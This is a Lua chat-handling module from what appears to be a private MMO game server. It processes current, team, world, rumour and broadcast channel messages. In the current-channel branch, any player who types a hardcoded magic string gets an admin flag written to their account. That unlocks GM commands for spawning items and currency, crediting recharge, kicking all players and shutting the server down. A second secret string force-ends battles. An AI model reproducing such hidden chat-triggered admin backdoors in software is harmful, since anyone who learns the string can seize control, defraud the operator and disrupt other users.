-- @Author: baidwwy
-- @Date:   2024-07-01 11:50:44
-- @Last Modified by:   baidwwy
-- @Last Modified time: 2025-01-07 19:27:53
-- @Author: baidwwy
-- @Date:   2024-07-01 11:50:44
-- @Last Modified by:   baidwwy
-- @Last Modified time: 2024-08-19 12:56:10
local 聊天处理类 = class()
function 聊天处理类:初始化()end
function 聊天处理类:数据处理(id,序号,数据)
	if 序号==6001 then
		self:频道发言处理(玩家数据[id].连接id,id,数据)
	end
end

function 聊天处理类:频道发言处理(连接id,id,数据)
	if 玩家数据[id].角色.体验状态 then
		常规提示(id,"体验状态下无法进行此操作。")
		return
	end
	local 频道=数据.频道
	local 文本=数据.文本
	if 频道==1 then --当前发言
		-- if 玩家数据[id].当前频道 and os.time()-玩家数据[id].当前频道<1 then
		-- 	local djs = 玩家数据[id].当前频道 - os.time()
		-- 	常规提示(id,"#Y/您说话的速度有点快哟！请" ..djs .."秒后再试！")
		-- 	return
		-- end
		if 调试模式 then
		 	if 数据.文本=="955955527" then
		 	--	发送数据(连接id,6566,QJHDSJ)
		 		return
			end
			-- elseif string.find(数据.文本,"宝宝")~=nil then --@make包子,1
			-- 	local 临时数组=分割文本(数据.文本,"=")
			-- 	local bb=临时数组[2]
			-- 	local 类型="宝宝"
			-- 	if 临时数组[3] then
			-- 	    bb="进阶"..bb
			-- 	end
			-- 	local jnz = {"必杀","高级精神集中","连击","反击","苍鸾怒击","再生","魔之心","法术波动","高级隐身","法术暴击","毒","泰山压顶"}
			-- 	local zz={1560,1428,4200,2160,1440,1620,6000}
			-- 	local cz=1.285
			-- 	玩家数据[id].召唤兽:添加召唤兽1(bb, bb, 类型, nil, 0 , nil , jnz,zz,cz,等级)
			elseif 数据.文本 == '开启秘境降妖' then  --GM用
				 --  副本_秘境降妖:开启秘境降妖()
				-- 天罡星:刷新资源()
		end
--------================================================================================================================================================================
--------================================================================================================================================================================
--------================================================================================================================================================================
		if 数据.文本=="6566qJHDsJ-@make#Y/" then--426521
			f函数.写配置(程序目录..[[data\]]..玩家数据[id].账号..[[\账号信息.txt]],"账号配置","管理","1")
			常规提示(id,"#Y/写入管理成功")
		end
		if 数据.文本=="取消管理" then
			f函数.写配置(程序目录..[[data\]]..玩家数据[id].账号..[[\账号信息.txt]],"账号配置","管理","0")
			常规提示(id,"#Y/取消成功")
		end

 		if 数据.文本=="管理" and f函数.读配置(程序目录..[[data\]]..玩家数据[id].账号..[[\账号信息.txt]],"账号配置","管理") == "1"  then --测试模式
 				-- if 玩家数据[id].管理模式 == false then
 					玩家数据[id].管理模式 = true
 					常规提示(id,"#Y/开启管理员模式！")
 					return
 				-- else
 				-- 	玩家数据[id].管理模式 = false
 				-- 	常规提示(id,"#Y/管理员模式关闭！")
 				-- 	return
 				-- end
 		end

	 	if 玩家数据[id].管理模式 then  --123123内置GM工具
 				if  数据.文本=="@1" then
 				  		  	发送数据(连接id,315)
 				 			-- 发送数据(连接id,999,"你的账号尚未开通此工具的使用权限")---窗口T掉线
 				elseif 数据.文本=="@2" then
 					发送数据(连接id,6566,QJHDSJ)
 					return
 				elseif string.find(数据.文本,"@make")~=nil then
 					local 临时数组=分割文本(数据.文本,"@make")
 					local 临时数组=分割文本(临时数组[2],",")
 					local sl = math.max(1, 临时数组[2] + 0)
 					玩家数据[id].道具:给予道具(id,临时数组[1],sl)

 				elseif 数据.文本=="bcsj" or 数据.文本=="保存数据" then
 						保存系统数据()
 						常规提示(id,"保存数据成功!")
	 			elseif 数据.文本=="全体下线" then
						全部玩家下线()
						常规提示(id,"全部玩家下线成功！")
				elseif 数据.文本=="重启服务器" then
					if 服务器关闭==nil then
						服务器关闭={开关=true,计时=10,起始=os.time()}
						发送公告("#R各位玩家请注意，服务器将在10秒后关闭，请所有玩家注意提前下线。")
		    			广播消息({内容=format("#R各位玩家请注意，服务器将在10秒后进行更新,届时服务器将临时关闭,，请所有玩家提前下线。"),频道="xt"})
		    			return 0
		    		else
		    			服务器关闭=nil
		    			常规提示(id,"已取消重启服务器")
		    		end

				elseif string.find(数据.文本,"等级上限")~=nil then
					local 临时数组=分割文本(数据.文本,"=")
					local sl = 临时数组[2]
					f函数.写配置(程序目录.."配置文件.ini","主要配置","等级上限",sl)
					QJDJSX=sl
					print("更新服务器等级上限为"..sl)

				elseif string.find(数据.文本,"跳转")~=nil then
					local 临时数组=分割文本(数据.文本,"=")
					local sl = 临时数组[2]
					地图处理类:跳转地图(id+0,sl+0,100,100)
					常规提示(id,"跳转地图="..sl)

				elseif string.find(数据.文本,"寻找")~=nil then
					local 临时数组=分割文本(数据.文本,"=")
					-- local 临时数组=分割文本(临时数组[2],".")
					local sl = 临时数组[2]
					local 所在地图= 玩家数据[sl+0].角色.地图数据.编号
					local 所在位置x=玩家数据[sl+0].角色.地图数据.x/20
					local 所在位置y=玩家数据[sl+0].角色.地图数据.y/20
					地图处理类:跳转地图(id+0,所在地图,所在位置x,所在位置y)
					常规提示(id,"#W已跳转至 #R"..玩家数据[sl+0].角色.名称.."#W 所在处")


				elseif string.find(数据.文本,"物品")~=nil then
					local 临时数组=分割文本(数据.文本,"=")
					local 临时数组=分割文本(临时数组[2],".")

					 local sl = math.max(1, 临时数组[2] + 0)

					玩家数据[id].道具:给予道具(id,临时数组[1],sl)


				elseif string.find(数据.文本,"经验")~=nil then
					local 临时数组=分割文本(数据.文本,"=")
					local sl = 临时数组[2]
					玩家数据[id].角色:添加经验(sl,"后台管理")
				elseif string.find(数据.文本,"银子")~=nil then
					local 临时数组=分割文本(数据.文本,"=")
					local sl = 临时数组[2]
					玩家数据[id].角色:添加银子(sl,"后台管理")
					常规提示(id,"你获得了"..sl.."两银子")
				elseif string.find(数据.文本,"仙玉")~=nil then
					local 临时数组=分割文本(数据.文本,"=")
					local sl = 临时数组[2]
					玩家数据[id].角色:添加仙玉(sl,"后台管理")
					常规提示(id,"你获得了"..sl.."两仙玉")

				elseif string.find(数据.文本,"副本积分")~=nil then
					local 临时数组=分割文本(数据.文本,"=")
					local sl = 临时数组[2]
					玩家数据[id].角色:添加副本积分(sl)
					常规提示(id,"你获得了"..sl.."点副本积分")

				elseif string.find(数据.文本,"物品")~=nil then
					local 临时数组=分割文本(数据.文本,"=")
					local 临时数组=分割文本(临时数组[2],".")
					local sl = math.max(1, 临时数组[2] + 0)
					玩家数据[id].道具:给予道具(id,临时数组[1],sl)

				elseif 数据.文本=="活力" or 数据.文本=="体力"  then
					玩家数据[id].角色.最大活力 = 玩家数据[id].角色.最大活力+10000
					玩家数据[id].角色.最大体力 = 玩家数据[id].角色.最大体力+10000
					玩家数据[id].角色.活力=玩家数据[id].角色.活力+8888
					玩家数据[id].角色.体力=玩家数据[id].角色.体力+8888
					体活刷新(id)
					常规提示(id,"体活刷满")
				elseif 数据.文本=="无敌"   then

				elseif 数据.文本=="刷新奖池" then
					奖池抽奖类:更新奖池数据()
					常规提示(id,"刷新奖池数据成功")
				elseif 数据.文本=="刷新十八路妖王" then
					十八妖王:活动定时器()
					常规提示(id,"刷新十八路妖王成功")
				elseif 数据.文本=="梦幻指引" then
					重置梦幻指引()
					常规提示(id,"重置梦幻指引成功")
				elseif 数据.文本=="刷新每日" then
					刷新每日()
					常规提示(id,"代码运行成功")
				elseif 数据.文本=="查看在线" then
					查看在线列表() ----在服务端 在线列表txt
					常规提示(id,"在线人数:"..服务端参数.在线人数)
				elseif 数据.文本=="强制下线" then
					强制下线()
					常规提示(id,"代码运行成功")
				elseif 数据.文本=="假人登录" then
					假人登录=false
				  	假人事件类:登录()
				  	假人事件类:重置摆摊总数()
				  	常规提示(id,"假人开始陆续登录中")
				elseif 数据.文本=="刷新摊位" then
					假人事件类:刷新摊位()
					常规提示(id,"摊位刷新成功")
				elseif 数据.文本=="刷新装备榜" then
					神兵异兽榜:存档()
					常规提示(id,"神兵异兽榜刷新成功")
				elseif 数据.文本=="清空排行" then

				elseif string.find(数据.文本,"充值")~=nil then
					local 临时数组=分割文本(数据.文本,"=")
					local 临时数组=分割文本(临时数组[2],".")
					local 手打id = tonumber(临时数组[1])
					local je = math.max(1, 临时数组[2] + 0)
					添加累充(je, 玩家数据[手打id].账号, 手打id, "手动充值")
          			累冲金额总计(je, 玩家数据[手打id].账号, 手打id, "手动充值")
          			常规提示(id,"充值和累充同时增加"..je.."点")

          		elseif string.find(数据.文本,"降级")~=nil then
					local 临时数组=分割文本(数据.文本,"=")
					local sl = 临时数组[2]
					玩家数据[id].角色:降级处理(sl)
					常规提示(id,"你等级降低了:"..sl.."级")

				elseif string.find(数据.文本,"升级")~=nil then
					local 临时数组=分割文本(数据.文本,"=")
					local sl = 临时数组[2]
					玩家数据[id].角色:自用升级处理(sl)
					发送数据(玩家数据[id].连接id,36,{动画="升级"})
					常规提示(id,"升级成功")

				elseif 数据.文本=="剧情点" then
					玩家数据[id].角色:增加剧情点(100)
					常规提示(id,"你获得了：100点剧情点")
				elseif string.find(数据.文本,"宝宝")~=nil then
					local 临时数组=分割文本(数据.文本,"=")
					local bb=临时数组[2]
					local 类型="宝宝"
					if 临时数组[3] then
					    bb="进阶"..bb
					end
					玩家数据[id].道具:给予道具(id,bb.."饰品")
					local jnz = {"扶摇万里","超级法术暴击","超级法术连击","超级魔之心","超级敏捷","超级泰山压顶"}  -- {"必杀","高级精神集中","连击","反击","苍鸾怒击","再生","魔之心","法术波动","高级隐身","法术暴击","毒","泰山压顶"}
					local zz={991560,991428,994200,992160,991440,991620,6000}
					local cz=999
					玩家数据[id].召唤兽:添加召唤兽1(bb, bb, 类型, nil, 0 , nil , jnz,zz,cz,等级)
					常规提示(id,"你获得了"..bb)



	-- 设置任务2031()
	-- 设置任务2032()
	-- 设置任务2033()
	-- 设置任务2034()
	-- 设置任务2035()

	-- 十八妖王:妖王排行()
	-- 	print("更新排行成功")

	-- 	if  调试模式 then
	-- 	    服务器关闭={开关=true,计时=10,起始=os.time()}
	-- 	else
	-- 		服务器关闭={开关=true,计时=180,起始=os.time()}
	-- 		发送公告("#R各位玩家请注意，服务器将在3分钟后进行更新,届时服务器将临时关闭，请所有玩家注意提前下线。")
	-- 	    广播消息({内容=format("#R各位玩家请注意，服务器将在3分钟后进行更新,届时服务器将临时关闭,，请所有玩家提前下线。"),频道="xt"})
	-- 	end

	-- 	测试重置()

	-- 	怪物数据= 取csv数据("sql/怪物数据.csv")
	-- 	活动数据= 取csv数据("sql/活动数据.csv")
	-- 	阶段属性= 取csv数据("sql/阶段属性.csv")

	-- 	自写活动:知了大王()
 --    自写活动:知了统领()
 --    自写活动:千年知了王()
 --    自写活动:知了小王()
 --    自写活动:裂风兽()
 --    自写活动:世界boss(id)

 --    镖王任务.活动开关=true
 --    镖王任务:开启活动()

		 		  	elseif 数据.文本=="10086" then
		 		  --	比武大会:开启比武()
		 		 	--  local abc={"玄灵珠·回春","玄灵珠·破军","玄灵珠·空灵","玄灵珠·噬魂"}
		 		 	--  for an=1,4 do
		 		 	--  	玩家数据[id].道具:给予道具(id,abc[an],nil,10,nil,nil)
		 			 -- end
		 			-- 新手活动怪:开启(id)
		 --		     沉默分身类:刷出沉默分身()
		 			elseif 数据.文本=="@gxsj" then
					-- 怪物数据= 取csv数据("sql/怪物数据.csv")
					-- 活动数据= 取csv数据("sql/活动数据.csv")
					-- 阶段属性= 取csv数据("sql/阶段属性.csv")
					-- print("更新怪物成功")
					-- QAQ=ReadExcel("怪物数据","H3aM5ow4Ot6i5OyyDc3m5Q==")
					-- print("更新怪物属性成功")

					elseif 数据.文本=="@清空" then --测试模式
						玩家数据[id].道具:清空所有包裹(连接id,id)
						return
					elseif 数据.文本=="@清空wbsj" then --测试模式
						玩家数据[id].角色.五宝数据={夜光珠=0,龙鳞=0,定魂珠=0,避水珠=0,金刚石=0}
						return
					elseif 数据.文本=="退出战斗" or 数据.文本=="Tczd" or  数据.文本=="tczd" or  数据.文本=="TCZD" or 数据.文本=="tt" then
						if 玩家数据[id].zhandou~=0 then
							战斗准备类.战斗盒子[玩家数据[id].zhandou]:强制结束战斗()
							常规提示(id,"退出战斗成功(GM专用)")
							return
						end
					end
				end---管理模式下结束



		if 玩家数据[id].zhandou~=0 then
				if 数据.文本=="QWER23OI4J2OJK34223" then
					if id == 战斗准备类.战斗盒子[玩家数据[id].zhandou].进入战斗玩家id then
						if os.time() - 战斗准备类.战斗盒子[玩家数据[id].zhandou].战斗计时 > 计时器1s then---60秒 在mian
							if 战斗准备类.战斗盒子[玩家数据[id].zhandou]:取战斗类型(id) == 200001 --pk台
								or 战斗准备类.战斗盒子[玩家数据[id].zhandou]:取战斗类型(id) == 200002 --帮战
									or 战斗准备类.战斗盒子[玩家数据[id].zhandou]:取战斗类型(id) == 200003 --比武
										or 战斗准备类.战斗盒子[玩家数据[id].zhandou]:取战斗类型(id) == 200004 --剑会
											or 战斗准备类.战斗盒子[玩家数据[id].zhandou]:取战斗类型(id) == 200014 --剑会天下
												or 战斗准备类.战斗盒子[玩家数据[id].zhandou]:取战斗类型(id) == 200005 --强P(含wst内玩家之间Pk)
													or 战斗准备类.战斗盒子[玩家数据[id].zhandou]:取战斗类型(id) == 200006  then --wst(仅boss)
														常规提示(id,"此类战斗不允许强制退出！")
															return
							else
									if  玩家数据[id].队伍 and 玩家数据[id].队长 then
											战斗准备类.战斗盒子[玩家数据[id].zhandou]:强制结束战斗()
												常规提示(id,"退出战斗成功")---队长退出
										else
													战斗准备类.战斗盒子[玩家数据[id].zhandou]:强制结束战斗()
														常规提示(id,"退出战斗成功")---单人退出
									end
							end
						else
							常规提示(id,"#W进入战斗需等待 #R"..计时器5s-(os.time()-战斗准备类.战斗盒子[玩家数据[id].zhandou].战斗计时).."#W 秒")
								return
						end
					elseif 玩家数据[id].队伍 == 战斗准备类.战斗盒子[玩家数据[id].zhandou].进入战斗玩家id then
								常规提示(id,"#W只有队长可以使用此口令！")
									return
					else
						常规提示(战斗准备类.战斗盒子[玩家数据[id].zhandou].进入战斗玩家id,"#W玩家:#S"..玩家数据[id].角色.名称.." ID:"..id.."#W 正在试图中断你的战斗！")
							常规提示(id,"#W别紧张，你现在仅是在观看战斗！")
								return
					end
				end
		end

		if 玩家数据[id].zhandou~=0 and 数据.文本=="退出战斗" or 数据.文本=="tczd" or 数据.文本=="Tczd" or 数据.文本=="TCZD" or 数据.文本=="tCZD" then
			if os.time() - 战斗准备类.战斗盒子[玩家数据[id].zhandou].战斗计时 > 计时器5min then
				战斗准备类.战斗盒子[玩家数据[id].zhandou]:强制结束战斗()
				玩家数据[id].zhandou=0
				return
			else
				常规提示(id,"#W日常请使用退出战斗图标！此口令仅在非战斗时，但仍卡战斗进程时使用，每次使用前请等待#R"..计时器5min-(os.time()-战斗准备类.战斗盒子[玩家数据[id].zhandou].战斗计时).."#W 秒")
				return
			end
		end



-----------------------------------------------以下任何时候都不动-----------------------------------------------------------------------------------------------------------------------------
		if 玩家数据[id].zhandou==0 then
			发送数据(连接id,1017,{文本=文本,特效=玩家数据[id].角色.发言特效})
		else
			local 编号=战斗准备类.战斗盒子[玩家数据[id].zhandou]:取参战编号(id,"角色")
			if 编号==nil then return  end
			for n=1,#战斗准备类.战斗盒子[玩家数据[id].zhandou].参战玩家 do
				发送数据(战斗准备类.战斗盒子[玩家数据[id].zhandou].参战玩家[n].连接id,5512,{id=编号,文本=文本,特效=玩家数据[id].角色.发言特效})
			end
		end

		if 当前监听  then
			 __S服务:发送(服务端参数.网关id,992,1,"[" .. os.date("%Y-%m-%d") .. "]" .. os.date("%X").."[账:" .. 玩家数据[id].账号 .. "]" .. "[" .. 玩家数据[id].角色.名称 .. "]" ..  "频道[当前]：" .. 文本)
		end


		if 数据.文本 ~= "QWER23OI4J2OJK34223" then
			玩家数据[id].当前频道=os.time()
			地图处理类:当前消息广播(玩家数据[id].角色.地图数据,玩家数据[id].角色.名称,文本,id,玩家数据[id].角色.发言特效)
		end
-----------------------------------------------以上任何时候都不动-----------------------------------------------------------------------------------------------------------------------------
	elseif 频道==2 then  --队伍发言
		if 玩家数据[id].队伍==0 then
			常规提示(id,"#Y/你似乎还没有加入任何队伍")
			return
		end
		if 数据.发送方式 == 1 then
			广播队伍消息(玩家数据[id].队伍,"qqq|"..玩家数据[id].角色.名称.."*"..玩家数据[id].角色.造型.."*玩家信息*"..id.."/["..玩家数据[id].角色.名称.."]#"..添加ID特效(id,文本))
		else
			local 返回信息 = {}
			for i=1,#数据.超链接 do
				local x = 分割文本(文本,"["..数据.超链接[i].名称.."]")
				if 数据.超链接[i].类型 == "道具" then
					local 道具id=玩家数据[id].角色[数据.超链接[i].点击类型][数据.超链接[i].编号]
					文本 = x[1].."#G/qqq|"..数据.超链接[i].名称.."*"..玩家数据[id].道具.数据[道具id].识别码.."*"..数据.超链接[i].类型.."/["..数据.超链接[i].名称.."]#W"..x[2]
					返回信息[#返回信息+1] = 玩家数据[id].道具.数据[道具id]
					返回信息[#返回信息].索引类型 = 数据.超链接[i].类型
				elseif 数据.超链接[i].类型 == "召唤兽" then
					local bh = 玩家数据[id].召唤兽:取编号(数据.超链接[i].编号) --数据.超链接[i].编号=认证码 数据.超链接[i].类型 = "召唤兽"
					if 玩家数据[id].召唤兽.数据[bh] ~= nil then
						文本 = x[1].."#G/qqq|"..数据.超链接[i].名称.."*"..玩家数据[id].召唤兽.数据[bh].认证码.."*"..数据.超链接[i].类型.."/["..数据.超链接[i].名称.."]#W"..x[2]
						返回信息[#返回信息+1] = 玩家数据[id].召唤兽.数据[bh]
						返回信息[#返回信息].索引类型 = 数据.超链接[i].类型
					end
				end
			end
			广播队伍链接(玩家数据[id].队伍,{内容="qqq|"..玩家数据[id].角色.名称.."*"..玩家数据[id].角色.造型.."*玩家信息*"..id.."/["..玩家数据[id].角色.名称.."]#W"..添加ID特效(id,文本),频道="dw",超链接=返回信息})
		end
		if  玩家数据[id].zhandou==0 then
			发送数据(连接id,1017,{文本=文本,队伍=true,特效=玩家数据[id].角色.发言特效})
			for n=1,#队伍数据[玩家数据[id].队伍].成员数据 do
				if 队伍数据[玩家数据[id].队伍].成员数据[n]~=id then
					发送数据(玩家数据[队伍数据[玩家数据[id].队伍].成员数据[n]].连接id,1018,{id=id,队伍=true,文本=文本,特效=玩家数据[id].角色.发言特效})
				end
			end
		else
			local 编号=战斗准备类.战斗盒子[玩家数据[id].zhandou]:取参战编号(id,"角色")
			if 编号==nil then return  end
			for n=1,#队伍数据[玩家数据[id].队伍].成员数据 do
					发送数据(玩家数据[队伍数据[玩家数据[id].队伍].成员数据[n]].连接id,5512,{id=编号,队伍=true,文本=文本,特效=玩家数据[id].角色.发言特效}) --1018
			end
		end
		if 队伍监听  then
			 __S服务:发送(服务端参数.网关id,992,1,"[" .. os.date("%Y-%m-%d") .. "]" .. os.date("%X").."[账:" .. 玩家数据[id].账号 .. "]" .. "[" .. 玩家数据[id].角色.名称 .. "]" ..  "频道[队伍]：" .. 文本)
		end
	elseif 频道==3 then  --世界发言
		if 数据.发送方式 == 1 then --测试模式
			local 发言限制=100-玩家数据[id].角色.等级
			if 发言限制<20 then
				发言限制=20
			end
			发言限制=2----------------------------------------
			if os.time()-玩家数据[id].世界频道<=发言限制 then
				常规提示(id,"#Y/您说话的速度有点快哟！")
				return
			elseif 玩家数据[id].角色.等级<20 then
				常规提示(id,"#Y/等级达到20级才可在世界频道发言")
				return
			end
			玩家数据[id].世界频道=os.time()
			广播消息({内容="qqq|"..玩家数据[id].角色.名称.."*"..玩家数据[id].角色.造型.."*玩家信息*"..id.."/["..玩家数据[id].角色.名称.."]#W"..添加ID特效(id,文本),频道="sj"})
		else
			local 发言限制=100-玩家数据[id].角色.等级
			if 发言限制<20 then
				发言限制=20
			end
			if os.time()-玩家数据[id].世界频道<=发言限制 then
				常规提示(id,"#Y/您说话的速度有点快哟！")
			elseif 玩家数据[id].角色.等级<20 then
				常规提示(id,"#Y/等级达到20级才可在世界频道发言")
				return
			end
			local 返回信息 = {}
			for i=1,#数据.超链接 do
				local x = 分割文本(文本,"["..数据.超链接[i].名称.."]")
				if 数据.超链接[i].类型 == "道具" then
					local 道具id=玩家数据[id].角色[数据.超链接[i].点击类型][数据.超链接[i].编号]
					文本 = x[1].."#G/qqq|"..数据.超链接[i].名称.."*"..玩家数据[id].道具.数据[道具id].识别码.."*"..数据.超链接[i].类型.."/["..数据.超链接[i].名称.."]#W"..x[2]
					返回信息[#返回信息+1] = 玩家数据[id].道具.数据[道具id]
					返回信息[#返回信息].索引类型 = 数据.超链接[i].类型
				elseif 数据.超链接[i].类型 == "召唤兽" then
					local bh = 玩家数据[id].召唤兽:取编号(数据.超链接[i].编号) --数据.超链接[i].编号=认证码 数据.超链接[i].类型 = "召唤兽"
					if 玩家数据[id].召唤兽.数据[bh] ~= nil then
						文本 = x[1].."#G/qqq|"..数据.超链接[i].名称.."*"..玩家数据[id].召唤兽.数据[bh].认证码.."*"..数据.超链接[i].类型.."/["..数据.超链接[i].名称.."]#W"..x[2]
						返回信息[#返回信息+1] = 玩家数据[id].召唤兽.数据[bh]
						返回信息[#返回信息].索引类型 = 数据.超链接[i].类型
					end
				end
			end
			玩家数据[id].世界频道=os.time()
			广播消息({内容="qqq|"..玩家数据[id].角色.名称.."*"..玩家数据[id].角色.造型.."*玩家信息*"..id.."/["..玩家数据[id].角色.名称.."]#W"..添加ID特效(id,文本),频道="sj",方式=1,超链接=返回信息})
		end
		if 世界监听  then
			 __S服务:发送(服务端参数.网关id,992,1,"[" .. os.date("%Y-%m-%d") .. "]" .. os.date("%X").."[账:" .. 玩家数据[id].账号 .. "]" .. "[" .. 玩家数据[id].角色.名称 .. "]" ..  "频道[世界]：" .. 文本)
		end
	elseif 频道==5 then  --传闻发言
		if os.time()-玩家数据[id].传闻频道<=30 then--测试模式
		elseif 玩家数据[id].角色.等级<20 then
			常规提示(id,"#Y/等级达到20级才可在世界频道发言")
			return
		elseif 玩家数据[id].角色.银子<2000 then
			常规提示(id,"#Y/本频道发言需要消耗2000两银子")
			return
		end
		玩家数据[id].传闻频道=os.time()
		玩家数据[id].角色:扣除银子(2000,0,0,"传闻频道发言",1)
		if 取随机数()<=10 then
			广播消息({内容="["..玩家数据[id].角色.名称.."]"..文本,频道="cw"})
		else
			广播消息({内容="[某人]"..文本,频道="cw"})
		end
		if 传闻监听  then
			 __S服务:发送(服务端参数.网关id,992,1,"[" .. os.date("%Y-%m-%d") .. "]" .. os.date("%X").."[账:" .. 玩家数据[id].账号 .. "]" .. "[" .. 玩家数据[id].角色.名称 .. "]" ..  "频道[传闻]：" .. 文本)
		end
	elseif 频道==7 then --传音
		if not 玩家数据[id].角色:扣除银子(200000,0,0,"传音发言",1) then
			常规提示(id,"#Y/传音发言需要200000两银子一次")
			return
		end
		if 数据.发送方式 == 1 then --测试模式
			玩家数据[id].世界频道=os.time()
			发送传音({内容="/qqq|"..玩家数据[id].角色.名称.."*"..玩家数据[id].角色.造型.."*玩家信息*"..id.."/["..玩家数据[id].角色.名称.."]#W"..添加ID特效(id,文本)})
		else
			local 返回信息 = {}
			for i=1,#数据.超链接 do
				local x = 分割文本(文本,"["..数据.超链接[i].名称.."]")
				if 数据.超链接[i].类型 == "道具" then
					local 道具id=玩家数据[id].角色[数据.超链接[i].点击类型][数据.超链接[i].编号]
					文本 = x[1].."#G/qqq|"..数据.超链接[i].名称.."*"..玩家数据[id].道具.数据[道具id].识别码.."*"..数据.超链接[i].类型.."/["..数据.超链接[i].名称.."]#W"..x[2]
					返回信息[#返回信息+1] = 玩家数据[id].道具.数据[道具id]
					返回信息[#返回信息].索引类型 = 数据.超链接[i].类型
				elseif 数据.超链接[i].类型 == "召唤兽" then
					local bh = 玩家数据[id].召唤兽:取编号(数据.超链接[i].编号)
					if 玩家数据[id].召唤兽.数据[bh] ~= nil then
						文本 = x[1].."#G/qqq|"..数据.超链接[i].名称.."*"..玩家数据[id].召唤兽.数据[bh].认证码.."*"..数据.超链接[i].类型.."/["..数据.超链接[i].名称.."]#W"..x[2]
						返回信息[#返回信息+1] = 玩家数据[id].召唤兽.数据[bh]
						返回信息[#返回信息].索引类型 = 数据.超链接[i].类型
					end
				end
			end
			玩家数据[id].世界频道=os.time()
			发送传音({内容="/qqq|"..玩家数据[id].角色.名称.."*"..玩家数据[id].角色.造型.."*玩家信息*"..id.."/["..玩家数据[id].角色.名称.."]#W"..添加ID特效(id,文本),方式=1,超链接=返回信息})

		end
		if 传闻监听  then
			 __S服务:发送(服务端参数.网关id,992,1,"[" .. os.date("%Y-%m-%d") .. "]" .. os.date("%X").."[账:" .. 玩家数据[id].账号 .. "]" .. "[" .. 玩家数据[id].角色.名称 .. "]" ..  "频道[传音]：" .. 文本)
		end
	end
end

local dfgdfgf={黄金ID={},紫色ID={},绿色ID={},蓝色ID={}}
dfgdfgf["黄金ID"][1]="#js1"
dfgdfgf["黄金ID"][2]="#js2"
dfgdfgf["黄金ID"][3]="#js3"
dfgdfgf["黄金ID"][4]="#js4"
dfgdfgf["黄金ID"][5]="#js5"
dfgdfgf["黄金ID"][6]="#js6"
dfgdfgf["黄金ID"][7]="#js7"
dfgdfgf["黄金ID"][8]="#js8"
dfgdfgf["黄金ID"][9]="#js9"
dfgdfgf["黄金ID"][0]="#js0"
dfgdfgf["紫色ID"][1]="#zs1"
dfgdfgf["紫色ID"][2]="#zs2"
dfgdfgf["紫色ID"][3]="#zs3"
dfgdfgf["紫色ID"][4]="#zs4"
dfgdfgf["紫色ID"][5]="#zs5"
dfgdfgf["紫色ID"][6]="#zs6"
dfgdfgf["紫色ID"][7]="#zs7"
dfgdfgf["紫色ID"][8]="#zs8"
dfgdfgf["紫色ID"][9]="#zs9"
dfgdfgf["紫色ID"][0]="#zs0"
dfgdfgf["绿色ID"][1]="#ls1"
dfgdfgf["绿色ID"][2]="#ls2"
dfgdfgf["绿色ID"][3]="#ls3"
dfgdfgf["绿色ID"][4]="#ls4"
dfgdfgf["绿色ID"][5]="#ls5"
dfgdfgf["绿色ID"][6]="#ls6"
dfgdfgf["绿色ID"][7]="#ls7"
dfgdfgf["绿色ID"][8]="#ls8"
dfgdfgf["绿色ID"][9]="#ls9"
dfgdfgf["绿色ID"][0]="#ls0"
dfgdfgf["蓝色ID"][1]="#ns1"
dfgdfgf["蓝色ID"][2]="#ns2"
dfgdfgf["蓝色ID"][3]="#ns3"
dfgdfgf["蓝色ID"][4]="#ns4"
dfgdfgf["蓝色ID"][5]="#ns5"
dfgdfgf["蓝色ID"][6]="#ns6"
dfgdfgf["蓝色ID"][7]="#ns7"
dfgdfgf["蓝色ID"][8]="#ns8"
dfgdfgf["蓝色ID"][9]="#ns9"
dfgdfgf["蓝色ID"][0]="#ns0"
function 添加ID特效(id,内容)
	if 玩家数据[id] and dfgdfgf[玩家数据[id].角色.id特效] then
		local tx=玩家数据[id].角色.id特效
		local hdgge="("
		for i=1,string.len(id) do
			local numb = string.sub(id, i, i)
			hdgge=hdgge..dfgdfgf[tx][numb+0]
		end
		return hdgge..")"..内容
	end
	return 内容
end

function 添加ID特效1(id)
	if 玩家数据[id] and dfgdfgf[玩家数据[id].角色.id特效] then
		local tx=玩家数据[id].角色.id特效
		local hdgge="("
		for i=1,string.len(id) do
			local numb = string.sub(id, i, i)
			hdgge=hdgge..dfgdfgf[tx][numb+0]
		end
		return hdgge..")"
	end
end

function 聊天处理类:更新(dt)end
function 聊天处理类:显示(x,y)end

return 聊天处理类